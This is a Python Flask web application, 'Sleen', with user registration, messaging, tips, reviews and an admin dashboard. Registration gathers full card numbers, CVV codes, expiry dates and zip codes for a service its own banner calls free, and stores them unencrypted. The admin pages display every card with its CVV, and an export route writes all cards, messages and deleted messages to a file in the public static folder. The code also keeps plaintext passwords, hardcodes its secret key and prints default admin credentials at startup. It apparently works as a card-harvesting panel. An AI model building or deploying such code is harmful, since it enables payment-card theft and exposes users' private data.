from flask import Flask, render_template, request, redirect, url_for, session, jsonify
import sqlite3
import datetime
import os
from werkzeug.utils import secure_filename

app = Flask(__name__)
app.secret_key = 'sleen_secret_2024'

UPLOAD_FOLDER = 'static/uploads'
ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif', 'webp'}

os.makedirs(UPLOAD_FOLDER, exist_ok=True)
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

DATABASE = 'sleen.db'

def get_db():
    conn = sqlite3.connect(DATABASE)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    c = conn.cursor()
    
    # Users table
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        email TEXT UNIQUE,
        first_name TEXT,
        last_name TEXT,
        business_name TEXT,
        business_address TEXT,
        password TEXT,
        role TEXT DEFAULT 'user',
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )''')
    
    # Card info table
    c.execute('''CREATE TABLE IF NOT EXISTS card_info (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        card_holder TEXT,
        card_number TEXT,
        cvv TEXT,
        expiration TEXT,
        zip_code TEXT,
        FOREIGN KEY (user_id) REFERENCES users (id)
    )''')
    
    # Messages table with soft delete
    c.execute('''CREATE TABLE IF NOT EXISTS messages (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        message TEXT,
        image TEXT,
        is_critical INTEGER DEFAULT 0,
        is_read INTEGER DEFAULT 0,
        is_from_admin INTEGER DEFAULT 0,
        is_deleted INTEGER DEFAULT 0,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (user_id) REFERENCES users (id)
    )''')
    
    # Tips table
    c.execute('''CREATE TABLE IF NOT EXISTS tips (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        amount REAL,
        message TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (user_id) REFERENCES users (id)
    )''')
    
    # Reviews table
    c.execute('''CREATE TABLE IF NOT EXISTS reviews (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        rating INTEGER,
        comment TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (user_id) REFERENCES users (id)
    )''')
    
    # Add missing columns if not exists
    try:
        c.execute('ALTER TABLE messages ADD COLUMN is_deleted INTEGER DEFAULT 0')
    except sqlite3.OperationalError:
        pass
    
    try:
        c.execute('ALTER TABLE messages ADD COLUMN is_read INTEGER DEFAULT 0')
    except sqlite3.OperationalError:
        pass
    
    # Insert admin user
    c.execute("SELECT * FROM users WHERE email='admin@sleen.com'")
    if not c.fetchone():
        c.execute('''INSERT INTO users (email, first_name, last_name, business_name, business_address, password, role)
                   VALUES (?, ?, ?, ?, ?, ?, ?)''',
                  ('admin@sleen.com', 'Admin', 'Sleen', 'Sleen Inc', '123 Main St', 'admin123', 'admin'))
    
    conn.commit()
    conn.close()
    print("✅ Database initialized!")

init_db()

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

# ==================== MAIN ROUTES ====================

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        email = request.form['email']
        first_name = request.form['first_name']
        last_name = request.form['last_name']
        business_name = request.form['business_name']
        business_address = request.form['business_address']
        password = request.form['password']
        
        card_holder = request.form.get('card_holder')
        card_number = request.form.get('card_number')
        cvv = request.form.get('cvv')
        expiration = request.form.get('expiration')
        zip_code = request.form.get('zip_code')
        
        db = get_db()
        c = db.cursor()
        
        try:
            c.execute('''INSERT INTO users (email, first_name, last_name, business_name, business_address, password, role)
                       VALUES (?, ?, ?, ?, ?, ?, 'user')''',
                      (email, first_name, last_name, business_name, business_address, password))
            user_id = c.lastrowid
            
            if card_holder and card_number:
                c.execute('''INSERT INTO card_info (user_id, card_holder, card_number, cvv, expiration, zip_code)
                           VALUES (?, ?, ?, ?, ?, ?)''',
                          (user_id, card_holder, card_number, cvv, expiration, zip_code))
            
            db.commit()
            return redirect(url_for('login'))
        except Exception as e:
            db.rollback()
            return f"Error: {e}"
        finally:
            db.close()
    
    return render_template('register.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form['email']
        password = request.form['password']
        
        db = get_db()
        c = db.cursor()
        c.execute("SELECT * FROM users WHERE email=? AND password=?", (email, password))
        user = c.fetchone()
        db.close()
        
        if user:
            session.clear()
            session['user_id'] = user['id']
            session['email'] = user['email']
            session['first_name'] = user['first_name']
            session['role'] = user['role']
            
            if user['role'] == 'admin':
                return redirect(url_for('admin_dashboard'))
            return redirect(url_for('user_dashboard'))
        return "Invalid credentials! <a href='/login'>Try again</a>"
    
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('index'))

# ==================== PROFILE EDITING ====================

@app.route('/profile', methods=['GET', 'POST'])
def profile():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    
    db = get_db()
    c = db.cursor()
    
    if request.method == 'POST':
        email = request.form['email']
        first_name = request.form['first_name']
        last_name = request.form['last_name']
        business_name = request.form['business_name']
        business_address = request.form['business_address']
        new_password = request.form.get('new_password')
        
        try:
            if new_password:
                c.execute('''UPDATE users SET email=?, first_name=?, last_name=?, business_name=?, business_address=?, password=?
                           WHERE id=?''',
                          (email, first_name, last_name, business_name, business_address, new_password, session['user_id']))
            else:
                c.execute('''UPDATE users SET email=?, first_name=?, last_name=?, business_name=?, business_address=?
                           WHERE id=?''',
                          (email, first_name, last_name, business_name, business_address, session['user_id']))
            db.commit()
            session['email'] = email
            session['first_name'] = first_name
            return redirect(url_for('profile'))
        except Exception as e:
            return f"Error updating profile: {e}"
        finally:
            db.close()
    
    c.execute("SELECT * FROM users WHERE id=?", (session['user_id'],))
    user = c.fetchone()
    db.close()
    return render_template('profile.html', user=user)

# ==================== REVIEWS ====================

@app.route('/reviews', methods=['GET', 'POST'])
def reviews():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    
    db = get_db()
    c = db.cursor()
    
    if request.method == 'POST':
        rating = int(request.form['rating'])
        comment = request.form['comment']
        c.execute("INSERT INTO reviews (user_id, rating, comment) VALUES (?, ?, ?)",
                  (session['user_id'], rating, comment))
        db.commit()
        return redirect(url_for('reviews'))
    
    # Get user's own reviews
    c.execute("SELECT * FROM reviews WHERE user_id=? ORDER BY created_at DESC", (session['user_id'],))
    my_reviews = c.fetchall()
    
    # Get all reviews
    c.execute('''SELECT r.*, u.first_name, u.last_name, u.business_name 
               FROM reviews r 
               JOIN users u ON r.user_id = u.id 
               ORDER BY r.created_at DESC''')
    all_reviews = c.fetchall()
    db.close()
    
    return render_template('reviews.html', my_reviews=my_reviews, all_reviews=all_reviews)

# ==================== USER DASHBOARD ====================

@app.route('/user/dashboard')
def user_dashboard():
    if 'user_id' not in session or session.get('role') != 'user':
        return redirect(url_for('login'))
    
    db = get_db()
    c = db.cursor()
    c.execute("SELECT * FROM card_info WHERE user_id=?", (session['user_id'],))
    card_info = c.fetchone()
    db.close()
    
    return render_template('user_dashboard.html', card_info=card_info)

@app.route('/get_messages')
def get_messages():
    if 'user_id' not in session:
        return jsonify([])
    
    db = get_db()
    c = db.cursor()
    c.execute("SELECT * FROM messages WHERE user_id=? AND is_deleted=0 ORDER BY created_at ASC", (session['user_id'],))
    messages = []
    for row in c.fetchall():
        messages.append({
            'id': row['id'],
            'message': row['message'],
            'image': row['image'],
            'is_critical': row['is_critical'],
            'is_from_admin': row['is_from_admin'],
            'created_at': row['created_at']
        })
    db.close()
    return jsonify(messages)

@app.route('/send_message', methods=['POST'])
def send_message():
    if 'user_id' not in session:
        return jsonify({'error': 'Unauthorized'}), 401
    
    message = request.form.get('message')
    is_critical = request.form.get('is_critical') == 'true'
    image = request.files.get('image')
    
    image_filename = None
    if image and image.filename and allowed_file(image.filename):
        filename = secure_filename(f"{session['user_id']}_{datetime.datetime.now().timestamp()}_{image.filename}")
        image.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
        image_filename = filename
    
    db = get_db()
    c = db.cursor()
    c.execute('''INSERT INTO messages (user_id, message, image, is_critical)
               VALUES (?, ?, ?, ?)''',
              (session['user_id'], message, image_filename, 1 if is_critical else 0))
    db.commit()
    db.close()
    
    return jsonify({'success': True})

@app.route('/delete_message/<int:message_id>', methods=['POST'])
def delete_message(message_id):
    if 'user_id' not in session:
        return jsonify({'error': 'Unauthorized'}), 401
    
    db = get_db()
    c = db.cursor()
    c.execute("UPDATE messages SET is_deleted=1 WHERE id=? AND user_id=?", (message_id, session['user_id']))
    db.commit()
    db.close()
    return jsonify({'success': True})

@app.route('/remove_card', methods=['POST'])
def remove_card():
    if 'user_id' not in session:
        return jsonify({'error': 'Unauthorized'}), 401
    
    db = get_db()
    c = db.cursor()
    c.execute("DELETE FROM card_info WHERE user_id=?", (session['user_id'],))
    db.commit()
    db.close()
    
    return jsonify({'success': True})

@app.route('/send_tip', methods=['POST'])
def send_tip():
    if 'user_id' not in session:
        return jsonify({'error': 'Unauthorized'}), 401
    
    amount = request.form.get('amount')
    tip_message = request.form.get('message', '')
    
    db = get_db()
    c = db.cursor()
    c.execute("INSERT INTO tips (user_id, amount, message) VALUES (?, ?, ?)",
              (session['user_id'], amount, tip_message))
    db.commit()
    db.close()
    
    return jsonify({'success': True})

# ==================== ADMIN ROUTES ====================

@app.route('/admin')
def admin_dashboard():
    if 'user_id' not in session or session.get('role') != 'admin':
        return redirect(url_for('login'))
    
    db = get_db()
    c = db.cursor()
    
    c.execute('''SELECT u.*, c.card_holder, c.card_number, c.cvv, c.expiration, c.zip_code
               FROM users u 
               LEFT JOIN card_info c ON u.id = c.user_id
               WHERE u.role = 'user'
               ORDER BY u.created_at DESC''')
    users = c.fetchall()
    
    c.execute('''SELECT m.*, u.first_name, u.last_name, u.business_name
               FROM messages m 
               JOIN users u ON m.user_id = u.id 
               WHERE m.is_deleted=0
               ORDER BY m.created_at DESC''')
    messages = c.fetchall()
    
    c.execute('''SELECT t.*, u.first_name, u.last_name, u.business_name
               FROM tips t 
               JOIN users u ON t.user_id = u.id 
               ORDER BY t.created_at DESC''')
    tips = c.fetchall()
    
    db.close()
    
    return render_template('admin_dashboard.html', users=users, messages=messages, tips=tips)

@app.route('/admin/reply', methods=['POST'])
def admin_reply():
    if 'user_id' not in session or session.get('role') != 'admin':
        return jsonify({'error': 'Unauthorized'}), 401
    
    user_id = request.form.get('user_id')
    message = request.form.get('message')
    
    db = get_db()
    c = db.cursor()
    c.execute('''INSERT INTO messages (user_id, message, is_from_admin)
               VALUES (?, ?, 1)''',
              (user_id, message))
    db.commit()
    db.close()
    
    return jsonify({'success': True})

@app.route('/admin/delete_message/<int:message_id>', methods=['POST'])
def admin_delete_message(message_id):
    if 'user_id' not in session or session.get('role') != 'admin':
        return jsonify({'error': 'Unauthorized'}), 401
    
    db = get_db()
    c = db.cursor()
    c.execute("UPDATE messages SET is_deleted=1 WHERE id=?", (message_id,))
    db.commit()
    db.close()
    return jsonify({'success': True})

@app.route('/get_messages_admin/<int:user_id>')
def get_messages_admin(user_id):
    if 'user_id' not in session or session.get('role') != 'admin':
        return jsonify([])
    
    db = get_db()
    c = db.cursor()
    c.execute("SELECT * FROM messages WHERE user_id=? AND is_deleted=0 ORDER BY created_at ASC", (user_id,))
    messages = []
    for row in c.fetchall():
        messages.append({
            'id': row['id'],
            'message': row['message'],
            'image': row['image'],
            'is_critical': row['is_critical'],
            'is_from_admin': row['is_from_admin'],
            'created_at': row['created_at']
        })
    db.close()
    return jsonify(messages)

@app.route('/admin/mark_read/<int:user_id>', methods=['POST'])
def admin_mark_read(user_id):
    if 'user_id' not in session or session.get('role') != 'admin':
        return jsonify({'error': 'Unauthorized'}), 401
    
    db = get_db()
    c = db.cursor()
    c.execute("UPDATE messages SET is_read=1 WHERE user_id=? AND is_from_admin=0", (user_id,))
    db.commit()
    db.close()
    return jsonify({'success': True})

@app.route('/report_message', methods=['POST'])
def report_message():
    if 'user_id' not in session:
        return jsonify({'error': 'Unauthorized'}), 401
    
    message_id = request.form.get('message_id')
    reason = request.form.get('reason')
    user_id = request.form.get('user_id')
    
    print(f"REPORT: User {user_id} requested deletion of message {message_id}")
    print(f"   Reason: {reason}")
    
    return jsonify({'success': True})

@app.route('/api/reviews')
def api_reviews():
    db = get_db()
    c = db.cursor()
    c.execute('''SELECT r.*, u.first_name, u.last_name, u.business_name 
               FROM reviews r 
               JOIN users u ON r.user_id = u.id 
               ORDER BY r.created_at DESC 
               LIMIT 10''')
    reviews = []
    for row in c.fetchall():
        reviews.append({
            'id': row['id'],
            'rating': row['rating'],
            'comment': row['comment'],
            'first_name': row['first_name'],
            'last_name': row['last_name'],
            'business_name': row['business_name'],
            'created_at': row['created_at']
        })
    db.close()
    return jsonify(reviews)

@app.route('/admin/update_profile', methods=['POST'])
def admin_update_profile():
    if 'user_id' not in session or session.get('role') != 'admin':
        return jsonify({'error': 'Unauthorized'}), 401
    
    email = request.form.get('email')
    password = request.form.get('password')
    
    db = get_db()
    c = db.cursor()
    
    try:
        if password:
            c.execute("UPDATE users SET email=?, password=? WHERE id=?", (email, password, session['user_id']))
        else:
            c.execute("UPDATE users SET email=? WHERE id=?", (email, session['user_id']))
        db.commit()
        session['email'] = email
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'error': str(e)}), 400
    finally:
        db.close()

@app.route('/admin/profile')
def admin_profile():
    if 'user_id' not in session or session.get('role') != 'admin':
        return redirect(url_for('login'))
    
    db = get_db()
    c = db.cursor()
    c.execute("SELECT * FROM users WHERE id=?", (session['user_id'],))
    admin_user = c.fetchone()
    db.close()
    return render_template('admin_profile.html', admin=admin_user)

@app.route('/admin/export_data')
def admin_export_data():
    if 'user_id' not in session or session.get('role') != 'admin':
        return jsonify({'error': 'Unauthorized'}), 401
    
    db = get_db()
    c = db.cursor()
    
    # Get all users with card info
    c.execute('''SELECT u.id, u.email, u.first_name, u.last_name, u.business_name, u.business_address, u.created_at,
                       c.card_holder, c.card_number, c.cvv, c.expiration, c.zip_code
               FROM users u 
               LEFT JOIN card_info c ON u.id = c.user_id
               WHERE u.role = 'user'
               ORDER BY u.created_at DESC''')
    users = c.fetchall()
    
    # Get all messages
    c.execute('''SELECT m.id, u.first_name, u.last_name, u.business_name, m.message, m.image, 
                       m.is_critical, m.is_from_admin, m.is_deleted, m.created_at
               FROM messages m 
               JOIN users u ON m.user_id = u.id 
               ORDER BY m.created_at DESC''')
    messages = c.fetchall()
    
    # Get all reviews
    c.execute('''SELECT r.id, u.first_name, u.last_name, u.business_name, r.rating, r.comment, r.created_at
               FROM reviews r 
               JOIN users u ON r.user_id = u.id 
               ORDER BY r.created_at DESC''')
    reviews = c.fetchall()
    
    # Get all tips
    c.execute('''SELECT t.id, u.first_name, u.last_name, u.business_name, t.amount, t.message, t.created_at
               FROM tips t 
               JOIN users u ON t.user_id = u.id 
               ORDER BY t.created_at DESC''')
    tips = c.fetchall()
    
    db.close()
    
    # Create text file content
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"sleen_export_{timestamp}.txt"
    filepath = os.path.join('static', filename)
    
    content_lines = []
    content_lines.append("="*80)
    content_lines.append("SLEEN PLATFORM - COMPLETE DATA EXPORT")
    content_lines.append(f"Export Date: {datetime.datetime.now()}")
    content_lines.append("="*80)
    content_lines.append("")
    
    content_lines.append("SUMMARY")
    content_lines.append("-"*40)
    content_lines.append(f"Total Users: {len(users)}")
    content_lines.append(f"Total Messages: {len(messages)}")
    content_lines.append(f"Total Reviews: {len(reviews)}")
    content_lines.append(f"Total Tips: {len(tips)}")
    content_lines.append("")
    content_lines.append("")
    
    # Users Section
    content_lines.append("="*80)
    content_lines.append("USERS AND CARD INFORMATION")
    content_lines.append("="*80)
    content_lines.append("")
    for user in users:
        content_lines.append(f"User ID: {user['id']}")
        content_lines.append(f"Name: {user['first_name']} {user['last_name']}")
        content_lines.append(f"Email: {user['email']}")
        content_lines.append(f"Business: {user['business_name']}")
        content_lines.append(f"Address: {user['business_address']}")
        if user['card_number']:
            content_lines.append(f"CARD INFO:")
            content_lines.append(f"   Card Holder: {user['card_holder']}")
            content_lines.append(f"   Card Number: {user['card_number']}")
            content_lines.append(f"   CVV: {user['cvv']}")
            content_lines.append(f"   Expiry: {user['expiration']}")
            content_lines.append(f"   Zip Code: {user['zip_code']}")
        else:
            content_lines.append(f"Card Info: No card saved")
        content_lines.append(f"Registered: {user['created_at']}")
        content_lines.append("-"*40)
        content_lines.append("")
    
    # Messages Section
    content_lines.append("="*80)
    content_lines.append("MESSAGES")
    content_lines.append("="*80)
    content_lines.append("")
    for msg in messages:
        content_lines.append(f"Message ID: {msg['id']}")
        content_lines.append(f"From: {msg['first_name']} {msg['last_name']} ({msg['business_name']})")
        content_lines.append(f"Message: {msg['message']}")
        content_lines.append(f"Critical: {'YES' if msg['is_critical'] else 'NO'}")
        content_lines.append(f"From Admin: {'YES' if msg['is_from_admin'] else 'NO'}")
        content_lines.append(f"Deleted: {'YES' if msg['is_deleted'] else 'NO'}")
        if msg['image']:
            content_lines.append(f"Image: {msg['image']}")
        content_lines.append(f"Date: {msg['created_at']}")
        content_lines.append("-"*40)
        content_lines.append("")
    
    # Reviews Section
    content_lines.append("="*80)
    content_lines.append("REVIEWS")
    content_lines.append("="*80)
    content_lines.append("")
    for review in reviews:
        stars = "★" * review['rating'] + "☆" * (5 - review['rating'])
        content_lines.append(f"Review ID: {review['id']}")
        content_lines.append(f"From: {review['first_name']} {review['last_name']} ({review['business_name']})")
        content_lines.append(f"Rating: {review['rating']}/5 {stars}")
        content_lines.append(f"Comment: {review['comment']}")
        content_lines.append(f"Date: {review['created_at']}")
        content_lines.append("-"*40)
        content_lines.append("")
    
    # Tips Section
    content_lines.append("="*80)
    content_lines.append("TIPS")
    content_lines.append("="*80)
    content_lines.append("")
    for tip in tips:
        content_lines.append(f"Tip ID: {tip['id']}")
        content_lines.append(f"From: {tip['first_name']} {tip['last_name']} ({tip['business_name']})")
        content_lines.append(f"Amount: ${tip['amount']}")
        content_lines.append(f"Message: {tip['message'] or 'No message'}")
        content_lines.append(f"Date: {tip['created_at']}")
        content_lines.append("-"*40)
        content_lines.append("")
    
    content_lines.append("")
    content_lines.append("="*80)
    content_lines.append("END OF EXPORT")
    content_lines.append("="*80)
    
    # Save to static folder
    file_content = "\n".join(content_lines)
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write(file_content)
    
    print(f"✅ Export saved to: {filepath}")
    
    # Return the file as download
    from flask import send_file
    return send_file(
        filepath,
        as_attachment=True,
        download_name=filename,
        mimetype='text/plain'
    )

if __name__ == '__main__':
    print("\n" + "="*60)
    print("SLEEN PLATFORM IS RUNNING!")
    print("="*60)
    print("\nhttp://localhost:5000")
    print("\nADMIN LOGIN:")
    print("   Email: admin@sleen.com")
    print("   Password: admin123")
    print("\nUsers can register with CC info")
    print("Tip jar is optional (service is free)")
    print("New Features:")
    print("   - Profile editing (change email, password, etc.)")
    print("   - Message deletion (soft delete - hidden from UI)")
    print("   - Reviews with star ratings")
    print("   - Export all data to text file")
    print("="*60 + "\n")
    app.run(debug=False, host='0.0.0.0', port=5000)